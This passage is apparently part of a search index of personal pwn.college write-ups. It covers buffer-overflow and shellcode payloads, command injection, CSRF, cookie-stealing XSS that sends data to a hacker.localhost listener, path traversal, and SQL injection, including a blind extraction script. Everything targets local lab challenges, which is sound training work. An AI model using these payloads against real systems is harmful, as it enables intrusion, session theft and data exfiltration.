0x58\nrbp = 0x7fffffffd6a0\npayload = b'\\x90'*offset\npayload += p64(rbp+16)\npayload += shellcode\n\nwith open(\"sc\", \"wb\") as f:\n    f.write(payload)\n\np.sendline(payload)\np.interactive()\n</code></pre> <p>rbp = 0x7fffffffd690 from GDB, and shellcode does get executed when checked in GDB <code>r &lt; &lt;(cat sc)</code> ; But in pwntools, rbp = 0x7fffffffd6a0 works. This 16-byte difference was also observed in easy version, where running in terminal printed buffer start as 0x7fffffffd660 while pwntools terminal printed 0x7fffffffd670</p>"},{"location":"pwn.college/Intro%20to%20Cybersecurity/Binary%20Exploitation/NOP%20Sleds/","title":"NOP Sleds","text":"<pre><code>This challenge will randomly skip up to 0x800 bytes in your shellcode.\n</code></pre> <p>So, we should prepend the <code>shellcode-raw</code> file from prev challenge with 0x800 (= 2048) <code>NOP (0x90)</code> instructions</p> <pre><code>printf '\\x90%.0s' {1..2048} | cat - shellcode-raw &gt; shellcode-raw-nop\ncat shellcode-raw-nop | /challenge/binary-exploitation-nopsled-shellcode\n</code></pre>"},{"location":"pwn.college/Intro%20to%20Cybersecurity/Binary%20Exploitation/NULL-Free%20Shellcode/","title":"NULL-free Shellcode","text":"<p>Changes to prev code:</p> <ol> <li><code>mov rbx, 0x00000067616c662f</code> -&gt; <code>mov ebx, 0x67616c66; shl rbx, 8; mov bl, 0x2f</code></li> <li><code>mov rax, 2</code> -&gt; <code>xor rax, rax; mov al, 2</code></li> <li><code>mov rsi, 0</code> -&gt; <code>xor rsi, rsi</code></li> <li><code>mov rdi, 1</code> -&gt; <code>xor rdi, rdi; inc rdi</code></li> <li><code>mov rdx, 0</code> -&gt; <code>xor rdx, rdx</code></li> <li><code>mov r10, 1000</code> -&gt; <code>xor r10, r10; add r10w, 0x3e8</code></li> <li><code>mov rax, 40</code> -&gt; <code>xor rax, rax; mov al, 40</code></li> <li><code>mov rax, 60</code> -&gt; <code>xor rax, rax; mov al, 60</code></li> </ol> <p>Final <code>shellcode.s</code>:</p> <pre><code>.global _start\n_start:\n.intel_syntax noprefix\n    mov ebx, 0x67616c66\n    shl rbx, 8\n    mov bl, 0x2f\n    push rbx\n    xor rax, rax\n    mov al, 2\n    mov rdi, rsp\n    xor rsi, rsi\n    syscall\n    xor rdi, rdi\n    inc rdi\n    mov rsi, rax\n    xor rdx, rdx\n    xor r10, r10\n    add r10w, 0x3e8\n    xor rax, rax\n    mov al, 40\n    syscall\n    xor rax, rax\n    mov al, 60\n    syscall\n</code></pre> <pre><code>gcc -nostdlib -static shellcode.s -o shellcode-elf\nobjcopy --dump-section .text=shellcode-raw shellcode-elf\ncat shellcode-raw | /challenge/binary-exploitation-null-free-shellcode\n</code></pre>"},{"location":"pwn.college/Intro%20to%20Cybersecurity/Binary%20Exploitation/PIEs/","title":"PIEs","text":""},{"location":"pwn.college/Intro%20to%20Cybersecurity/Binary%20Exploitation/PIEs/#pies-easy","title":"PIEs (easy)","text":"<ol> <li>GDB -&gt; <code>disas win_authed</code> -&gt; the address of instruction after auth check is 0x237e</li> <li> <p>As told in the debug output, the return address from challenge() is stored at 104 bytes from start of input buffer.</p> <p><code>shell echo -n -e \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\x7e\\x23\" | /challenge/binary-exploitation-pie-overflow-w</code></p> </li> </ol> <p>we need to write two bytes, then one of those nibbles (the fourth least-significant one) will be a guess, and it will be incorrect 15 of 16 times. This is okay: we can just run our exploit a few times until it works (statistically, ~50% chance after 11 times and ~90% chance after 36 times)</p>"},{"location":"pwn.college/Intro%20to%20Cybersecurity/Binary%20Exploitation/PIEs/#pies-hard","title":"PIEs (hard)","text":"<ol> <li> <p>In gdb, <code>disas win_authed</code> and <code>disas main</code>, we get to know:</p> <ul> <li>Instruction after auth check is at 0x174c</li> <li>challenge() returns at 0x19b9</li> </ul> </li> <li> <p>Set a breakpoint <code>b *challenge+158</code>, run and give a short string of a's as input</p> </li> <li><code>info frame</code> -&gt; rbp is at 0x7ffdcf51c100</li> <li><code>x/100xg $rbp-200</code>:<ul> <li>input buffer starts at 0x7ffdcf51c0b0, which is rbp-0x50 = rbp-80</li> <li>return address is stored at 0x7fffd6cd0ed8, which is rbp+0x8 = rbp+8</li> </ul> </li> <li> <p>88 a's followed by desired two bytes (one of the 4 nibbles is a guess, so have to run the exploit a few times):</p> <p><code>shell echo -n -e \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\x4c\\x17\" | /challenge/binary-exploitation-pie-overflow</code></p> </li> </ol>"},{"location":"pwn.college/Intro%20to%20Cybersecurity/Binary%20Exploitation/Precision/","title":"Precision","text":""},{"location":"pwn.college/Intro%20to%20Cybersecurity/Binary%20Exploitation/Precision/#precision-easy","title":"Precision (easy)","text":"<p>Positions of \"win\" and \"lose\" variables is given in the debug output \\ Sending 109-112 bytes works</p>"},{"location":"pwn.college/Intro%20to%20Cybersecurity/Binary%20Exploitation/Precision/#precision-hard","title":"Precision (hard)","text":"<ol> <li> <p>In gdb, <code>disas challenge</code>, we get to know:</p> <ul> <li>win is at rbp-0x14 = rbp-20</li> <li>lose is at rbp-0x10 = rbp-16</li> </ul> </li> <li> <p>Set a breakpoint <code>b *challenge+154</code>, run and give a long string of a's as input</p> </li> <li><code>info frame</code> -&gt; rbp is at 0x7ffcf5793e40</li> <li><code>x/100xg $rbp-200</code> -&gt; input buffer starts at 0x7ffcf5793e00, which is rbp-0x40 = rbp-64</li> <li>Giving 44-48 a's as input works</li> </ol>"},{"location":"pwn.college/Intro%20to%20Cybersecurity/Binary%20Exploitation/String%20Lengths/","title":"String Lengths","text":""},{"location":"pwn.college/Intro%20to%20Cybersecurity/Binary%20Exploitation/String%20Lengths/#string-lengths-easy","title":"String Lengths (easy)","text":"<ol> <li>GDB -&gt; <code>disas win_authed</code> -&gt; the address of instruction after auth check is 0x211f</li> <li>As told in the debug output, the return address from challenge() is stored at 72 bytes from start of input buffer</li> <li> <p>Observing from source code, length computed by strlen() on input must be &lt; 28</p> <p><code>shell echo -n -e \"aaa\\x00aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\x1f\\x21\" | /challenge/binary-exploitation-null-write-w</code></p> </li> </ol> <p>we need to write two bytes, then one of those nibbles (the fourth least-significant one) will be a guess, and it will be incorrect 15 of 16 times. This is okay: we can just run our exploit a few times until it works (statistically, ~50% chance after 11 times and ~90% chance after 36 times)</p>"},{"location":"pwn.college/Intro%20to%20Cybersecurity/Binary%20Exploitation/String%20Lengths/#string-lengths-hard","title":"String Lengths (hard)","text":"<ol> <li> <p>In gdb, <code>disas win_authed</code>, <code>disas main</code>, <code>disas challenge</code>, we get to know:</p> <ul> <li>Instruction after auth check is at 0x1797</li> <li>challenge() returns at 0x1ace</li> <li>return value of strlen() must be &lt;= 0x70 = 112</li> </ul> </li> <li> <p>Set a breakpoint <code>b *challenge+413</code>, run and give a short string of a's as input</p> </li> <li><code>info frame</code> -&gt; rbp is at 0x7ffcc677a8f0</li> <li><code>x/100xg $rbp-200</code>:<ul> <li>input buffer starts at 0x7ffcc677a850, which is rbp-0xa0 = rbp-160</li> <li>return address is stored at 0x7ffcc677a8f8, which is rbp+0x8 = rbp+8</li> </ul> </li> <li> <p>168 a's followed by desired two bytes (one of the 4 nibbles is a guess, so have to run the exploit a few times):</p> <p><code>shell echo -n -e \"aaaaa\\x00aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\x97\\x17\" | /challenge/binary-exploitation-null-write</code></p> </li> </ol>"},{"location":"pwn.college/Intro%20to%20Cybersecurity/Binary%20Exploitation/Tricky%20Control%20Hijack/","title":"Tricky Control Hijack","text":""},{"location":"pwn.college/Intro%20to%20Cybersecurity/Binary%20Exploitation/Tricky%20Control%20Hijack/#tricky-control-hijack-easy","title":"Tricky Control Hijack (easy)","text":"<ol> <li>GDB -&gt; <code>disas win_authed</code> -&gt; the address of instruction after auth check is 0x40203e</li> <li> <p>As told in the debug output, the return address from challenge() is stored at 56 bytes from start of input buffer.</p> <p><code>shell echo -n -e \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\x3e\\x20\\x40\\x00\\x00\\x00\\x00\\x00\" | /challenge/binary-exploitation-control-hijack-2-w</code></p> </li> </ol>"},{"location":"pwn.college/Intro%20to%20Cybersecurity/Binary%20Exploitation/Tricky%20Control%20Hijack/#tricky-control-hijack-hard","title":"Tricky Control Hijack (hard)","text":"<ol> <li> <p>In gdb, <code>disas win_authed</code> and <code>disas main</code>, we get to know:</p> <ul> <li>Instruction after auth check is at 0x00000000004021de</li> <li>challenge() returns at 0x0000000000402441</li> </ul> </li> <li> <p>Set a breakpoint <code>b *challenge+148</code>, run and give a short string of a's as input</p> </li> <li><code>info frame</code> -&gt; rbp is at 0x7ffd1df81e00</li> <li><code>x/100xg $rbp-200</code>:<ul> <li>input buffer starts at 0x7ffd1df81db0, which is rbp-0x50 = rbp-80</li> <li>return address is stored at 0x7ffd1df81e08, which is rbp+0x8 = rbp+8</li> </ul> </li> <li> <p>88 a's followed by desired address:</p> <p><code>shell echo -n -e \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\xde\\x21\\x40\\x00\\x00\\x00\\x00\\x00\" | /challenge/binary-exploitation-control-hijack-2</code></p> </li> </ol>"},{"location":"pwn.college/Intro%20to%20Cybersecurity/Binary%20Exploitation/Variable%20Control/","title":"Variable Control","text":""},{"location":"pwn.college/Intro%20to%20Cybersecurity/Binary%20Exploitation/Variable%20Control/#variable-control-easy","title":"Variable Control (easy)","text":"<p>As told in the debug output, the win variable is 64 bytes from input buffer and has to be set to 0x6eb781f0</p> <pre><code>echo -e -n \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\xf0\\x81\\xb7\\x6e\" | /challenge/binary-exploitation-var-control-w\n</code></pre>"},{"location":"pwn.college/Intro%20to%20Cybersecurity/Binary%20Exploitation/Variable%20Control/#variable-controle-hard","title":"Variable Controle (hard)","text":"<ol> <li> <p>In gdb, <code>disas challenge</code>, we get to know:</p> <ul> <li>win is at rbp-0x18 = rbp-24</li> <li>lose is at rbp-0x14 = rbp-20</li> <li>win has to be changed to 0x5a3c1e5a</li> </ul> </li> <li> <p>Set a breakpoint <code>b *challenge+163</code>, run and give a long string of a's as input</p> </li> <li><code>info frame</code> -&gt; rbp is at 0x7ffcc2692280</li> <li><code>x/100xg $rbp-200</code> -&gt; input buffer starts at 0x7ffcc2692230, which is rbp-0x50 = rbp-80</li> <li> <p>56 a's followed by desired value:</p> <p><code>shell echo -n -e \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\x5a\\x1e\\x3c\\x5a\" | /challenge/binary-exploitation-var-control</code></p> </li> </ol>"},{"location":"pwn.college/Intro%20to%20Cybersecurity/Binary%20Exploitation/Your%20First%20Overflow/","title":"Your First Overflow","text":""},{"location":"pwn.college/Intro%20to%20Cybersecurity/Binary%20Exploitation/Your%20First%20Overflow/#your-first-overflow-easy","title":"Your First Overflow (easy)","text":"<p>Value of <code>win</code> variable needs to be overwritten using buffer overflow. As written in the debug output, <code>win</code> is stored 68 bytes after the input. \\ Give atleast 69 bytes of input</p>"},{"location":"pwn.college/Intro%20to%20Cybersecurity/Binary%20Exploitation/Your%20First%20Overflow/#your-first-overflow-hard","title":"Your First Overflow (hard)","text":"<p>Value of <code>win</code> variable needs to be overwritten using buffer overflow. \\ Source code:</p> <pre><code>struct\n{\n    char input[98];\n    int win_variable;\n} data  = {0} ;\n</code></pre> <p>Trying input of 99, 100, 101 bytes... 100 works!</p>"},{"location":"pwn.college/Intro%20to%20Cybersecurity/Intercepting%20Communication/Connect/","title":"Connect","text":"<pre><code>nc &lt;host&gt; &lt;port&gt;\n</code></pre>"},{"location":"pwn.college/Intro%20to%20Cybersecurity/Intercepting%20Communication/Listen/","title":"Listen","text":"<pre><code>nc -l &lt;port&gt;\n</code></pre>"},{"location":"pwn.college/Intro%20to%20Cybersecurity/Intercepting%20Communication/Monitor/","title":"Monitor","text":""},{"location":"pwn.college/Intro%20to%20Cybersecurity/Intercepting%20Communication/Monitor/#monitor-1","title":"Monitor 1","text":"<pre><code>tcpdump -A port &lt;port&gt;\n</code></pre>"},{"location":"pwn.college/Intro%20to%20Cybersecurity/Intercepting%20Communication/Scan/","title":"Scan","text":""},{"location":"pwn.college/Intro%20to%20Cybersecurity/Intercepting%20Communication/Scan/#scan-1","title":"Scan 1","text":"<p>Find live host:</p> <pre><code>nmap -sn &lt;subnet&gt;\n</code></pre> <p>Connect:</p> <pre><code>nc &lt;host&gt; &lt;port&gt;\n</code></pre>"},{"location":"pwn.college/Intro%20to%20Cybersecurity/Intercepting%20Communication/Scan/#scan-2","title":"Scan 2","text":"<p>Tune <code>nmap</code> to find live host:</p> <pre><code>nmap -sn &lt;subnet&gt; --min-rate 10000 -T5 --max-retries 1\n</code></pre> <p>Connect:</p> <pre><code>nc &lt;host&gt; &lt;port&gt;\n</code></pre>"},{"location":"pwn.college/Intro%20to%20Cybersecurity/Web%20Security/Authentication%20Bypass/","title":"Authenication Bypass","text":""},{"location":"pwn.college/Intro%20to%20Cybersecurity/Web%20Security/Authentication%20Bypass/#authentication-bypass-1","title":"Authentication Bypass 1","text":"<pre><code>cat /challenge/server\n</code></pre> <p>The GET request accepts a query param \"session_user\" / If it is absent, login page is displayed. If present and equal to \"admin\" flag is displayed /</p> <p>Just go to <code>http://challenge.localhost/?session_user=admin</code></p>"},{"location":"pwn.college/Intro%20to%20Cybersecurity/Web%20Security/Authentication%20Bypass/#authentication-bypass-2","title":"Authentication Bypass 2","text":"<pre><code>cat /challenge/server\n</code></pre> <p>The GET request expects a cookie \"session_user\" / If it is absent, login page is displayed. If present and equal to \"admin\" flag is displayed /</p> <pre><code>curl -v --cookie \"session_user=admin\" http://challenge.localhost/\n</code></pre>"},{"location":"pwn.college/Intro%20to%20Cybersecurity/Web%20Security/CMDi/","title":"CMDi","text":""},{"location":"pwn.college/Intro%20to%20Cybersecurity/Web%20Security/CMDi/#cmdi-1","title":"CMDi 1","text":"<pre><code>cat /challenge/server\n</code></pre> <p>The Flask app takes a directory as query param (<code>/adventure?dir</code>) and executes <code>ls -l {dir}</code> Can inject <code>; cat &lt;flag&gt;</code></p> <p>Start the server and use curl:</p> <pre><code>curl http://challenge.localhost:80/adventure?dir=.%3B%20cat%20%2Fflag\n</code></pre> <p>(URL-encoding of \".; cat /flag\")</p>"},{"location":"pwn.college/Intro%20to%20Cybersecurity/Web%20Security/CMDi/#cmdi-2","title":"CMDi 2","text":"<pre><code>cat /challenge/server\n</code></pre> <p>The Flask app takes a directory as query param (<code>/stage?output-path</code>) and executes <code>ls -l {output-path}</code> Can't use previous solution as the server removes \";\"</p> <p>Executing this:</p> <pre><code>ls -l / | grep \"flag\" | awk '{print \"/\" $NF}' | xargs cat\n</code></pre> <p>Lists contents of <code>/</code>, takes the line with <code>flag</code>, prints only the last word \"flag\" along with a <code>/</code>, use this output as an argument of cat</p> <p>Start the server and use curl:</p> <pre><code>curl http://challenge.localhost:80/stage?output-path=%2F%20%7C%20grep%20%22flag%22%20%7C%20awk%20%27%7Bprint%20%22%2F%22%20%24NF%7D%27%20%7C%20xargs%20cat\n</code></pre>"},{"location":"pwn.college/Intro%20to%20Cybersecurity/Web%20Security/CMDi/#cmdi-3","title":"CMDi 3","text":"<pre><code>cat /challenge/server\n</code></pre> <p>The Flask app takes a directory as query param (<code>/trial?storage-path</code>) and executes <code>ls -l '{storage-path}'</code> Injection has to take care of <code>'</code></p> <p>Executing: \\ ls -l '.'; cat /flag; echo 'yayy'</p> <p>Start the server and use curl:</p> <pre><code>curl http://challenge.localhost:80/trial?storage-path=.%27%3B%20cat%20%2Fflag%3B%20echo%20%27yayy\n</code></pre>"},{"location":"pwn.college/Intro%20to%20Cybersecurity/Web%20Security/CMDi/#cmdi-4","title":"CMDi 4","text":"<pre><code>cat /challenge/server\n</code></pre> <p>The Flask app takes a timezone as query param (<code>/initiative?time-region</code>) and executes <code>TZ={time-region} date</code></p> <p>Executing: \\ TZ=Hogwarts;cat /flag; date</p> <p>Start the server and use curl:</p> <pre><code>curl http://challenge.localhost:80/initiative?time-region=Hogwarts%3Bcat%20%2Fflag%3B\n</code></pre>"},{"location":"pwn.college/Intro%20to%20Cybersecurity/Web%20Security/CMDi/#cmdi-5","title":"CMDi 5","text":"<pre><code>cat /challenge/server\n</code></pre> <p>The Flask app takes a path as query param (<code>/assignment?path</code>) and executes <code>touch {path}</code> Output is not shown, so <code>cat</code> won't work. But we can change the permission of the flag file and then read it.</p> <p>Executing: \\ touch /flag; chmod 777 /flag</p> <p>Start the server and use curl:</p> <pre><code>curl http://challenge.localhost:80/assignment?path=%2Fflag%3B%20chmod%20777%20%2Fflag\ncat /flag\n</code></pre>"},{"location":"pwn.college/Intro%20to%20Cybersecurity/Web%20Security/CMDi/#cmdi-6","title":"CMDi 6","text":"<pre><code>cat /challenge/server\n</code></pre> <p>The Flask app takes a path as query param (<code>/exercise?subdirectory</code>) and executes <code>ls -l {subdirectory}</code> \\ Problem: The special characters ; &amp; | &gt; &lt; ( ) ` $ all are blocked \\</p> <p>We know that newline can also be used as a command separator.</p> <p>Executing:</p> <pre><code>ls -l .\ncat /flag\n</code></pre> <p>Start the server and use curl:</p> <pre><code>curl http://challenge.localhost:80/exercise?subdirectory=.%0Acat%20/flag\n</code></pre>"},{"location":"pwn.college/Intro%20to%20Cybersecurity/Web%20Security/CSRF/","title":"CSRF","text":""},{"location":"pwn.college/Intro%20to%20Cybersecurity/Web%20Security/CSRF/#csrf-1","title":"CSRF 1","text":"<p>Create a html page to serve, which makes the GET request via top-level navigation:</p> <p>index.html:</p> <pre><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;body onload=\"window.location='http://challenge.localhost/publish'\"&gt;&lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>Run in the directory of index.html:</p> <pre><code>python3 -m http.server 1337 --bind hacker.localhost\n</code></pre>"},{"location":"pwn.college/Intro%20to%20Cybersecurity/Web%20Security/CSRF/#csrf-2","title":"CSRF 2","text":"<p>Create a html page to serve, which makes the POST request via self-submitting form:</p> <p>index.html:</p> <pre><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;body onload=\"document.forms[0].submit()\"&gt;\n    &lt;form action=\"http://challenge.localhost/publish\" method=\"POST\"&gt;&lt;/form&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>Run in the directory of index.html:</p> <pre><code>python3 -m http.server 1337 --bind hacker.localhost\n</code></pre>"},{"location":"pwn.college/Intro%20to%20Cybersecurity/Web%20Security/CSRF/#csrf-3","title":"CSRF 3","text":"<p>Triggering XSS through CSRF</p> <p>index.html:</p> <pre><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;body onload=\"window.location='http://challenge.localhost/ephemeral?msg='+'&lt;'+'script&gt;alert(&amp;quot;PWNED&amp;quot;)&lt;/script'+'&gt;'\"&gt;&lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>Run in the directory of index.html:</p> <pre><code>python3 -m http.server 1337 --bind hacker.localhost\n</code></pre>"},{"location":"pwn.college/Intro%20to%20Cybersecurity/Web%20Security/CSRF/#csrf-4","title":"CSRF 4","text":"<p>index.html:</p> <pre><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;body onload=\"window.location='http://challenge.localhost/ephemeral?msg='+'&lt;'+'script&gt;window.location.href=&amp;quot;http://hacker.localhost:5050?cookie=&amp;quot;%2bdocument.cookie&lt;/script'+'&gt;'\"&gt;&lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>Start the attacker server:</p> <pre><code>python3 -m http.server 1337 --bind hacker.localhost\n</code></pre> <p>Listen for cookie:</p> <pre><code>nc -l -v hacker.localhost 5050\n</code></pre> <p>Use the stolen cookie:</p> <pre><code>curl -v --cookie \"&lt;stolen cookie&gt;\" http://challenge.localhost\n</code></pre>"},{"location":"pwn.college/Intro%20to%20Cybersecurity/Web%20Security/CSRF/#csrf-5","title":"CSRF 5","text":"<p>index.html:</p> <pre><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;body onload=\"window.location='http://challenge.localhost/ephemeral?msg='+'&lt;'+'script&gt;fetch(&amp;quot;http://challenge.localhost/&amp;quot;).then(res=&gt;res.text()).then(data=&gt;{window.location.href=&amp;quot;http://hacker.localhost:5050?page=&amp;quot;%2bencodeURIComponent(data);});&lt;/script'+'&gt;'\"&gt;&lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>Start the attacker server:</p> <pre><code>python3 -m http.server 1337 --bind hacker.localhost\n</code></pre> <p>Listen for the page content:</p> <pre><code>nc -l -v hacker.localhost 5050\n</code></pre>"},{"location":"pwn.college/Intro%20to%20Cybersecurity/Web%20Security/Path%20Traversal/","title":"Path Traversal","text":""},{"location":"pwn.college/Intro%20to%20Cybersecurity/Web%20Security/Path%20Traversal/#path-traversal-1","title":"Path Traversal 1","text":"<pre><code>cat /challenge/server\n</code></pre> <p>The server is a Flask app that, on receiving requests at <code>/package/&lt;path&gt;</code>, serves the file at <code>/challenge/files/path</code> We know that the flag is at <code>/flag</code></p> <p>Start the server and use curl:</p> <pre><code>curl -v http://challenge.localhost:80/package/..%2F..%2Fflag\n</code></pre> <p>\"..%2F\" is URL-encoding of \"../\"</p>"},{"location":"pwn.college/Intro%20to%20Cybersecurity/Web%20Security/Path%20Traversal/#path-traversal-2","title":"Path Traversal 2","text":"<pre><code>cat /challenge/server\n</code></pre> <p>The server is a Flask app that, on receiving requests at <code>/data/&lt;path&gt;</code>, serves the file at <code>/challenge/files/path</code> We know that the flag is at <code>/flag</code> This time the server strips any leading and trailing \".\" or \"/\", so can't use the previous solution.</p> <pre><code>ls /challenge/files\n</code></pre> <p>The challenge files contain a directory <code>fortunes/</code>. We can use this as the start of the path string. Start the server and use curl:</p> <pre><code>curl -v http://challenge.localhost:80/data/fortunes/..%2F..%2F..%2Fflag\n</code></pre> <p>\"..%2F\" is URL-encoding of \"../\"</p>"},{"location":"pwn.college/Intro%20to%20Cybersecurity/Web%20Security/SQLi/","title":"SQLi","text":""},{"location":"pwn.college/Intro%20to%20Cybersecurity/Web%20Security/SQLi/#sqli-1","title":"SQLi 1","text":"<p>User: <code>admin</code> PIN: <code>1 OR 1=1</code></p> <p>SQL Query formed:</p> <pre><code>SELECT rowid, * FROM users WHERE username = 'admin' AND pin = 1 OR 1=1\n</code></pre>"},{"location":"pwn.college/Intro%20to%20Cybersecurity/Web%20Security/SQLi/#sqli-2","title":"SQLi 2","text":"<p>User: <code>admin</code> Password: <code>'pass OR '1'='1</code></p> <p>SQL Query formed:</p> <pre><code>SELECT rowid, * FROM users WHERE username = 'admin' AND password = 'pass' OR '1'='1'\n</code></pre>"},{"location":"pwn.college/Intro%20to%20Cybersecurity/Web%20Security/SQLi/#sqli-3","title":"SQLi 3","text":"<p>Observing the server code we get to know that the password of the admin is the flag.</p> <p>Query: admin\" UNION SELECT password FROM users WHERE username LIKE \"admin</p> <p>SQL Query formed:</p> <pre><code>SELECT username FROM users WHERE username LIKE \"admin\" UNION SELECT password FROM users WHERE username LIKE \"admin\"\n</code></pre>"},{"location":"pwn.college/Intro%20to%20Cybersecurity/Web%20Security/SQLi/#sqli-4","title":"SQLi 4","text":"<p>Since the server uses sqlite \\ Query: admin\" UNION SELECT tbl_name FROM sqlite_master WHERE tbl_name LIKE \"users%</p> <p>SQL Query formed (REDACTED is the randomized name of users table)</p> <pre><code>SELECT username FROM REDACTED WHERE username LIKE \"admin\" UNION SELECT tbl_name FROM sqlite_master WHERE tbl_name LIKE \"users%\"\n</code></pre> <p>This gives the name of the users table, now do same as SQLi 3</p>"},{"location":"pwn.college/Intro%20to%20Cybersecurity/Web%20Security/SQLi/#sqli-5","title":"SQLi 5","text":"<p>Python script:</p> <pre><code>import requests\n\nurl = \"http://challenge.localhost/\"\nusername = \"admin\"\npassword = \"' OR 1=1 AND password GLOB 'pwn.college{\"\n\nwhile True:\n    for i in range(33,127):\n        if chr(i) in [\"*\", \"?\"]:\n            continue\n        tmp = password + chr(i)\n        data = {\"username\": username, \"password\": tmp+\"*\"}\n        response = requests.post(url, data=data)\n        if response.status_code == 200:\n            password = tmp\n            print(f\"Found: {password}\")\n            if chr(i) == \"}\":\n                exit(0)\n            break\n</code></pre> <p>Using <code>GLOB</code> because <code>LIKE</code> is, by default, case-insensitive in SQLite.</p>"},{"location":"pwn.college/Intro%20to%20Cybersecurity/Web%20Security/XSS/","title":"XSS","text":""},{"location":"pwn.college/Intro%20to%20Cybersecurity/Web%20Security/XSS/#xss-1","title":"XSS 1","text":"<p>Stored XSS</p> <p>Submit HTML of input boxes as a post</p> <pre><code>&lt;input&gt; &lt;/input&gt;\n&lt;input&gt; &lt;/input&gt;\n</code></pre>"},{"location":"pwn.college/Intro%20to%20Cybersecurity/Web%20Security/XSS/#xss-2","title":"XSS 2","text":"<p>Submit script for alert as a post</p> <pre><code>&lt;script&gt; alert(\"PWNED\"); &lt;/script&gt;\n</code></pre>"},{"location":"pwn.college/Intro%20to%20Cybersecurity/Web%20Security/XSS/#xss-3","title":"XSS 3","text":"<p>Reflected XSS</p> <p>Send the script (AS IN xss 2) as a url parameter</p> <pre><code>http://challenge.localhost/?msg=%3Cscript%3Ealert%28%22PWNED%22%29%3C%2Fscript%3E\n</code></pre>"},{"location":"pwn.college/Intro%20to%20Cybersecurity/Web%20Security/XSS/#xss-4","title":"XSS 4","text":"<p>XSS Contexts</p> <p>Break out of the textarea and inject the script:</p> <pre><code>&lt;/textarea&gt;&lt;script&gt;alert(\"PWNED\");&lt;/script&gt;\n</code></pre>"},{"location":"pwn.college/Intro%20to%20Cybersecurity/Web%20Security/XSS/#xss-5","title":"XSS 5","text":"<p>Log in as \"hacker\" (credentials given in the server code) \\ Inspect and open Networks tab. Click on \"Publish your drafts\", and copy the GET request as Fetch. \\ Attach the fetch request to <code>onload</code> event:</p> <pre><code>&lt;script&gt;\n    window.onload= async function(){\n        await fetch(\"http://challenge.localhost/publish\", {\n            \"credentials\": \"include\",\n            .\n            .\n            other copied stuff\n        });\n    };\n&lt;/script&gt;\n</code></pre> <p>Publish this as a post.</p>"},{"location":"pwn.college/Intro%20to%20Cybersecurity/Web%20Security/XSS/#xss-6","title":"XSS 6","text":"<p>Similar to the previous.</p>"},{"location":"pwn.college/Intro%20to%20Cybersecurity/Web%20Security/XSS/#xss-7md","title":"XSS 7.md","text":"<p>Previous solution doesn't work, as posting by admin is disallowed. So have to login as admin to see drafts.</p> <p>Set up a listener:</p> <pre><code>nc -l -v challenge.localhost 20000\n</code></pre> <p>Craft a post to steal cookie:</p> <pre><code>&lt;script&gt;\nwindow.onload = async function() {\n    try {\n        await fetch(\"http://challenge.localhost:20000\", {\n            method: \"GET\",\n            credentials: \"include\" \n        });\n    } catch (error) {\n        console.error(\"Error:\", error);\n    }\n};\n&lt;/script&gt;\n</code></pre> <p>After getting the cookie, login:</p> <pre><code>curl -v --cookie \"&lt;stolen-cookie&gt;\"  http://challenge.localhost/\n</code></pre>"},{"location":"pwn.college/Program%20Security/Dynamic%20Allocator%20Misuse/","title":"Dynamic Allocator Misuse","text":""},{"location":"pwn.college/Program%20Security/Dynamic%20Allocator%20Misuse/#level-10","title":"level 1.0","text":"<p>Use-After-Free vulnerability</p> <p>On trying, output says read_flag option mallocs 741 bytes Malloc a chunk of size 741, free that chunk, now read the flag.. that chunk is reused. Now trying to print the freed chunk will print the flag</p> <pre><code>This challenge can manage up to 1 unique allocations.\n\n\n[*] Function (malloc/free/puts/read_flag/quit): malloc\n\nSize: 741\n\n[*] allocations[0] = malloc(741)\n[*] allocations[0] = 0x58b6847bf2c0\n\n[*] Function (malloc/free/puts/read_flag/quit): free\n\n[*] free(allocations[0])\n+====================+========================+==============+============================+============================+\n| TCACHE BIN #45     | SIZE: 729 - 744        | COUNT: 1     | HEAD: 0x58b6847bf2c0       | KEY: 0x58b6847bf010        |\n+====================+========================+==============+============================+============================+\n| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |\n+---------------------+---------------------+------------------------------+---------------------+---------------------+\n| 0x58b6847bf2c0      | 0                   | 0x2f1 (P)                    | (nil)               | 0x58b6847bf010      |\n+----------------------------------------------------------------------------------------------------------------------+\n\n\n[*] Function (malloc/free/puts/read_flag/quit): read_flag\n\n[*] flag_buffer = malloc(741)\n[*] flag_buffer = 0x58b6847bf2c0\n[*] read the flag!\n\n[*] Function (malloc/free/puts/read_flag/quit): puts\n\n[*] puts(allocations[0])\nData: pwn.college{xxxxx}\n\n\n[*] Function (malloc/free/puts/read_flag/quit): quit\n\n### 